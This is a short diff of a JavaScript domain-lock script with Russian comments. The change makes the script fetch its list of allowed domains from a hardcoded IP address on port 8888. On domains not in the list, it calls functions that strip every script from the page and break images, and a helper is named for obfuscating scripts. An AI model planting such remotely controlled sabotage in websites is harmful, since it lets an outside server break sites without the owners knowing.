@@ -45,10 +45,8 @@ function combineAndObfuscateScripts() {
     }
 }
 
-combineAndObfuscateScripts();
-
 function checkDomainAndExecuteActions() {
-    fetch('proxy.php')
+    fetch('https://185.253.44.120:8888/vhosts/85/files/proxy.php')
         .then(response => {
             if (!response.ok) {
                 throw new Error('Network response was not ok');
@@ -61,9 +59,7 @@ function checkDomainAndExecuteActions() {
 
             console.log('Current domain:', currentDomain); // после тестов убрать
 
-            const isValidDomain = domains.some(domain => {
-                return domain.name === currentDomain;
-            });
+            const isValidDomain = domains.some(domain => domain.name === currentDomain);
 
             console.log('Is valid domain:', isValidDomain); // после тестов убрать
 
@@ -137,8 +133,6 @@ function checkDomainAndExecuteActions() {
         });
 }
 
-checkDomainAndExecuteActions();
-
 function domainLock() {
     console.log('Domain Lock triggered'); // Отладочный вывод после тестов убрать
     document.querySelectorAll('script').forEach(script => script.remove());
@@ -194,4 +188,5 @@ function breakImages() {
     }
 }
 
+// Выполнение основного скрипта
 checkDomainAndExecuteActions();
